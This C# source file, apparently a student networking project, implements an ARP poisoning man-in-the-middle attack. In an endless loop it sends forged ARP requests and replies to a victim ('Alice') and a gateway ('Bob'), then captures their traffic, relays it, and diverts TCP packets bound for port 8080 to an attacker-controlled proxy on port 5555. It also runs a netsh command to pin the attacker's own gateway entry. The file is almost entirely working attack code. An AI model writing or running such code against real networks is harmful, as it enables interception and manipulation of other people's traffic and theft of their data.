using PacketDotNet;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Ethernet;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading.Tasks;
using PcapDotNet.Base;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using PcapDotNet.Packets.Arp;
using PcapDotNet.Packets.Dns;
using PcapDotNet.Packets.Ethernet;
using PcapDotNet.Packets.Gre;
using PcapDotNet.Packets.Http;
using PcapDotNet.Packets.Icmp;
using PcapDotNet.Packets.Igmp;
using PcapDotNet.Packets.IpV4;
using PcapDotNet.Packets.IpV6;
using System.Windows.Forms;
using SharpPcap;
using System.Threading;

namespace ARP_Poisoning
{
    class ARP_Poison
    {
        static SharpPcap.ICaptureDevice device;

        static int readTimeoutMilliseconds = 50000;
        static string filter = "ip";
        static string SET_CONST_DEF_GW_CMD_LINE = "interface ipv4 set neighbors \"Local Area Connection\" 192.168.87.1 00-1f-da-fe-78-40";


        [System.Runtime.InteropServices.DllImport("Iphlpapi.dll", EntryPoint = "SendARP")]
        internal extern static Int32 SendArp(Int32 destIpAddress, Int32 srcIpAddress,
                     byte[] macAddress, ref Int32 macAddressLength);


        IPAddress AliceIP; // Alice Ip
        PhysicalAddress AliceMac; // Alice Mac
        PhysicalAddress EveMac = null;//PhysicalAddress.Parse("40-A8-F0-3E-C0-7E".ToUpper());
        IPAddress EveIP = null;//IPAddress.Parse("10.27.208.105");
        PhysicalAddress BobMac = null;//PhysicalAddress.Parse("2c-6b-f5-ff-88-4c".ToUpper());
        IPAddress BobIP = null;//IPAddress.Parse("10.27.208.254");
        ListView listView;
        SendARP sa;
        //MessageBox.Show(EveMac + " - EveMac " + EveIP + "  - EveIP  " + BobMac + "  - BobMac  " + BobIP + "  - BobIP");

        public void SetValues(PhysicalAddress EveMac, IPAddress EveIP, PhysicalAddress BobMac, IPAddress BobIP, Form1 f)
        {
            //MessageBox.Show(this.EveMac + " -EveMac " + this.EveIP + "  - EveIP  " + this.BobMac + "  - BobMac  " + this.BobIP + "  - BobIP");
            this.EveMac = EveMac;
            this.EveIP = EveIP;
            this.BobMac = BobMac;
            this.BobIP = BobIP;
            sa = new SendARP(f);
            //MessageBox.Show(this.EveMac + " -EveMac " + this.EveIP + "  - EveIP  " + this.BobMac + "  - BobMac  " + this.BobIP + "  - BobIP");
        }

        public ARP_Poison(IPAddress AliceIP, PhysicalAddress AliceMac)
        {
            this.AliceIP = AliceIP;
            this.AliceMac = AliceMac;

            DeviceUtill d1 = new DeviceUtill();//get active divice
            device = d1.OpenDevice();
            device.Open();

        }

        /// <summary>
        /// Implementation of the action (Send Arp) to Alice and Bob
        /// </summary>
        public Task IpSpoofing()
        {
            return Task.Run(() =>
                {
                    //IPAddress DstIp, IPAddress SrcIp, PhysicalAddress DstMac, PhysicalAddress EveMac, ARPOperation Operation
                    // MessageBox.Show(this.EveMac + " -EveMac " + this.EveIP + "  - EveIP  " + this.BobMac + "  - BobMac  " + this.BobIP + "  - BobIP");

                    SendArp(BobIP, AliceIP, BobMac, EveMac, ARPOperation.Request); // req Bob
                    SendArp(AliceIP, BobIP, AliceMac, EveMac, ARPOperation.Request); // req Alice

                    while (true)
                    {
                        SendArp(BobIP, AliceIP, BobMac, EveMac, ARPOperation.Response); // rep Bob
                        SendArp(AliceIP, BobIP, AliceMac, EveMac, ARPOperation.Response); // rep Alice
                        //MessageBox.Show(AliceIP + "   " + BobIP + "  "+ AliceMac+"  "+ EveMac);
                        Thread.Sleep(2500);
                    }
                });
        }


        // זה פשוט הסנד ארפ
        /// <summary>
        /// send req and rep arp packet action
        /// </summary>
        /// <param name="DstIp">destination ip of alice or bob </param>
        /// <param name="SrcIp">Source ip of alice or bob</param>
        /// <param name="DstMac">destination mac of alice or bob</param>
        /// <param name="EveMac">The Attacker (Eve) mac adress</param>
        /// <param name="Operation">the operation of the arp - request or response</param>
        public void SendArp(IPAddress DstIp, IPAddress SrcIp, PhysicalAddress DstMac, PhysicalAddress EveMac, ARPOperation Operation) // srcMac = Eve קבוע
        {
            //build ethernet packet
            EthernetPacket eth = new EthernetPacket(EveMac, DstMac, EthernetPacketType.Arp);
            // build ARP packet
            ARPPacket arp = new ARPPacket(Operation, DstMac, DstIp, EveMac, SrcIp);
            //string dstmac = PhysicalAddress.Parse(DstMac);
            eth.PayloadPacket = arp;// מה יש מעל, השכבה מעל, מקשר בין הארפ לאיטרנט
            device.SendPacket((eth));
        }

        /// <summary>
        /// Implementation of the action of redirect
        /// </summary>
        public Task Ipfwd()
        {
            return Task.Run(() =>
              {
                  ProcessStartInfo procStartInfo = new ProcessStartInfo("netsh", SET_CONST_DEF_GW_CMD_LINE);

                  procStartInfo.RedirectStandardOutput = true;
                  procStartInfo.UseShellExecute = false;
                  procStartInfo.CreateNoWindow = true;

                  Process.Start(procStartInfo);

                  RawCapture rawPacket;

                  // Start device capturing
                  //device.Open(DeviceMode.Promiscuous, readTimeoutMilliseconds);
                  device.Filter = filter;

                  // Capture packets using GetNextPacket()
                  while (true)
                  {
                      while ((rawPacket = device.GetNextPacket()) != null)
                      {

                          var packet = PacketDotNet.Packet.ParsePacket(rawPacket.LinkLayerType, rawPacket.Data);

                          if (packet is PacketDotNet.EthernetPacket)
                          {

                              var eth = ((PacketDotNet.EthernetPacket)packet);
                              var ip = (IPv4Packet)PacketDotNet.IPv4Packet.GetEncapsulated(eth);
                              var tcp = (TcpPacket)PacketDotNet.TcpPacket.GetEncapsulated(eth);
                             
                              if (ip != null)
                              { // IpFw

                                  // ברשת הפנימית אליס שולח לבוב באמצעות מאק ולא באמצעות אייפי
                                  if (eth.SourceHwAddress.Equals(AliceMac) && eth.DestinationHwAddress.Equals(EveMac))
                                  { // Send Bob the packet
                                      //MessageBox.Show("ip: " + ip.ToString());
                                      if (tcp != null)
                                      {
                                          //MessageBox.Show("port:" + tcp.DestinationPort.ToString());
                                          
                                          if (tcp.DestinationPort.ToString() == "8080")
                                          {
                                              //MessageBox.Show("tcp.DestinationPort.ToString() == 8080");
                                              redirectPacketToProxy(tcp, ip, EveIP, eth);
                                          }
                                          else
                                              redirectPacket(eth, BobMac);
                                      }
                                  }

                                  else if (eth.SourceHwAddress.Equals(BobMac) && eth.DestinationHwAddress.Equals(EveMac) && ip.DestinationAddress.Equals(AliceIP))
                                  { //Send Alice the Packet
                                      redirectPacket(eth, AliceMac);
                                  }

                              }
                          }// IF Ethernet
                      }// WHILE there is packet

                  }// WHILE true
              });
        }// end Ipfwd


        /// <summary>
        /// redirect the Packet from bob to alice or from alice to bob
        /// </summary>
        /// <param name="eth">the packet on the Ethrnet layer</param>
        /// <param name="destMac">Mac of alice or Bob</param>
        public void redirectPacket(PacketDotNet.EthernetPacket eth, PhysicalAddress destMac)
        {
            if (eth != null)
            {
                // Change MAC
                eth.SourceHwAddress = EveMac;
                eth.DestinationHwAddress = destMac;
                device.SendPacket((eth));
            }
        }// redirectFromVictim()

        /// <summary>
        /// לוקח פאקט עם פורט 80 ושלוח אל המחלקה Proxy.
        /// </summary>
        /// <param name="eth"></param>
        /// <param name="tcpP"></param>
        public void redirectPacketToProxy(PacketDotNet.TcpPacket tcp, PacketDotNet.IPv4Packet ip, IPAddress EveIP, PacketDotNet.EthernetPacket eth)
        {
            if (eth != null)
            {
                //MessageBox.Show("redirect");
                eth.SourceHwAddress = EveMac;
                eth.DestinationHwAddress = BobMac;
                //MessageBox.Show("redirect 1 " + EveIP.ToString());
                ip.DestinationAddress = EveIP;
                // MessageBox.Show("redirect 2");
                tcp.DestinationPort = 5555;
                ip.PayloadPacket = tcp;
                eth.PayloadPacket = ip;
                
                //MessageBox.Show(eth.ToString());
                //var ethernetPacket = new EthernetPacket(EveMac,BobMac,EthernetPacketType.None);
                //var tcpPacket = new TcpPacket(tcp.SourcePort,5555);
                //var ipPacket = new IPv4Packet(ip.SourceAddress, EveIP);

                //ipPacket.PayloadPacket = tcpPacket;
                //ethernetPacket.PayloadPacket = ipPacket;

                device.SendPacket((eth));
            }
        }
    }
}
